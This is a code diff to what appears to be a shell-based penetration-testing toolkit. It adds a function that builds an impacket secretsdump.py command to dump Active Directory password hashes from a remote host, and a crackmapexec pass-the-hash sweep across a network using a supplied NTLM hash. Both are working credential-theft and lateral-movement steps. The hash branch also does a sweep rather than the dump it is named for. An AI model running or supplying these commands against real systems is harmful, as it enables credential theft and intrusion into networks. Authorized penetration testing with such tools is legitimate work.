@@ -19,6 +19,31 @@ DOC
 
 nb-ad-dump-hash-install() {
     __info "Running $0..."
-    __pkgs crackmapexec
+    __pkgs impacket
 }
 
+nb-ad-dump-hash() {
+    __check-project
+    __check-network
+    __check-domain
+    __check-user
+    echo
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} | tee -a ${__domainadpath}/${__USER}-hashdump.txt
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee -a $(__netadpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
